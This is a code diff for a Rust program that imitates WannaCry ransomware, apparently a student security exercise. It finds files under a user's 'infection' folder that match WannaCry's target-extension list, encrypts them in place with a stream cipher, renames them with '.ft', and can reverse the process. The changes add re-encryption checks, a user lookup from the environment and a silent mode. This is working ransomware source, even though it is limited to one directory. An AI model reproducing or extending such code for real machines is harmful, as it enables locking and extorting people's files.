@@ -56,7 +56,7 @@ fn handle_file(old_file_path: &PathBuf, new_file_path: &PathBuf) -> std::io::Res
 fn add_ft_ext(filepath: &PathBuf) -> PathBuf {
 
     let ext = filepath.extension().unwrap();
-    let verif = OsStr::new(".ft");
+    let verif = OsStr::new("ft");
 
     if ext != verif {
         let new_ext = format!("{}.ft", ext.to_str().unwrap());
@@ -75,6 +75,9 @@ fn rm_ft_ext(filepath: &PathBuf) -> PathBuf {
 
     if ext == "ft" {
         new_filepath.set_extension("");
+        if new_filepath.extension().is_none() {
+            new_filepath.set_extension("ft");
+        }
     }
 
     // println!("{:?}", filepath);
@@ -87,19 +90,39 @@ fn compute_hmac(data: &[u8]) -> Vec<u8> {
     mac.finalize().into_bytes().to_vec()
 }
 
-fn encrypt(cipher: &mut dyn StreamCipher, data: &Vec<u8>) -> Vec<u8>{
+fn encrypt(cipher: &mut dyn StreamCipher, data: &Vec<u8>, filepath: &PathBuf) -> Result<Vec<u8>, Box<dyn std::error::Error>>{
     let mut encrypted_data = data.clone();
 
     cipher.apply_keystream(&mut encrypted_data);
+
+    // println!("{}", data.len());
+
+    if data.len() > 32 {
+        let verif_hmac = compute_hmac(&data[..data.len() - 32]);
+
+        // println!("verif_Hmac = {:?}\n end_of_file = {:?}", verif_hmac, &data[data.len() - 32..]);
+    
+        if verif_hmac == &data[data.len() - 32..] {
+            let path = filepath.to_str().unwrap();
+            return Err(format!("Can't encrypt {} : the file has already been encrypted", path).into());
+        }
+    }
 
     let hmac = compute_hmac(&encrypted_data);
 
     encrypted_data.extend_from_slice(&hmac);
 
-    encrypted_data
+    Ok(encrypted_data)
 }
 
 fn decrypt(cipher: &mut dyn StreamCipher, data: &Vec<u8>, filepath: &PathBuf) -> Result<Vec<u8>, Box<dyn std::error::Error>>{
+    
+    // println!("{}", data.len());
+
+    if data.len() < 32 {
+        let path = filepath.to_str().unwrap();
+        return Err(format!("Can't decrypt {} : the file is too short", path).into());
+    }
     let hmac_stored = &data[data.len() - 32..];
 
     let hmac = compute_hmac(&data[..data.len() - 32]);
@@ -127,13 +150,19 @@ fn crypt(items: &CipherItems, filepath: &PathBuf, fn_ptr: fn(&PathBuf) -> PathBu
     let data_to_write: Vec<u8>;
 
     if fn_ptr == add_ft_ext {
-        data_to_write =  encrypt(&mut cipher, &data);
+        data_to_write = match encrypt(&mut cipher, &data, filepath) {
+            Ok(data_to_write) => data_to_write,
+            Err(e) => {
+                // println!("{:?}", e);
+                return Err(e)
+            },
+        };
     }
     else {
         data_to_write = match decrypt(&mut cipher, &data, filepath) {
             Ok(data_to_write) => data_to_write,
             Err(e) => {
-                println!("{:?}", e);
+                // println!("{:?}", e);
                 return Err(e)
             },
         };
@@ -161,7 +190,7 @@ fn get_extensions() -> Result<Vec<String>, Box<dyn std::error::Error>> {
 
     let str = match std::str::from_utf8(&wannacry_ext) {
         Ok(s) => s,
-        Err(e) => panic!("{e}"),
+        Err(_e) => panic!("Can't find wannacry_known_extensions.txt"),
     };
 
     let str = str.replace(".", "");
@@ -193,10 +222,10 @@ fn insert_in_vector(entry: Result<PathBuf, GlobError>, valid_files: &mut Vec<Pat
     }
 }
 
-fn get_valid_files(v_ext: &[String], extensions: &str) -> Vec<PathBuf> {
+fn get_valid_files(v_ext: &[String], user: &str, extensions: &str) -> Vec<PathBuf> {
     let mut valid_files: Vec<PathBuf> = Vec::new();
 
-    let master_path = "/home/facarval/infection/";
+    let master_path = format!("/home/{}/infection/", user);
 
     for entry in glob(&format!("{}{}", master_path, extensions)).expect("Failed to list directory") {
         insert_in_vector(entry,&mut valid_files, v_ext);
@@ -206,9 +235,20 @@ fn get_valid_files(v_ext: &[String], extensions: &str) -> Vec<PathBuf> {
     valid_files
 }
 
+fn debug_files(files: &[PathBuf]) {
+    println!("found {} file(s)", files.len());
+    for file in files {
+        println!("{}", file.display());
+    }
+}
+
 fn main() -> Result<(), Box<dyn std::error::Error>>{
 
     env::set_var("RUST_BACKTRACE", "1");
+    let user = match env::var("USER"){
+        Ok(user) => user,
+        Err(_e) => return Err("No USER in env".into()),
+    };
 
     let args = Args::parse();
 
@@ -237,16 +277,20 @@ fn main() -> Result<(), Box<dyn std::error::Error>>{
     let valid_files: Vec<PathBuf>;
 
     if args.reverse.is_some() {
-        valid_files = get_valid_files(&v_ext, "**/*.ft");
+        valid_files = get_valid_files(&v_ext, &user, "**/*.ft");
     }
     else {
-        valid_files = get_valid_files(&v_ext, "**/*");
+        valid_files = get_valid_files(&v_ext, &user, "**/*");
     }
 
-    // for file in &valid_files {
-    //     println!("{}", file.display());
-    // }
-    
+    if valid_files.is_empty() {
+        return Err("Path doesn't contain file".into());
+    }
+
+    if !items.silent {
+        debug_files(&valid_files);
+    }
+
     for file in &valid_files {
         if args.reverse.is_some() {
             _ = crypt(&items, &file, rm_ft_ext);
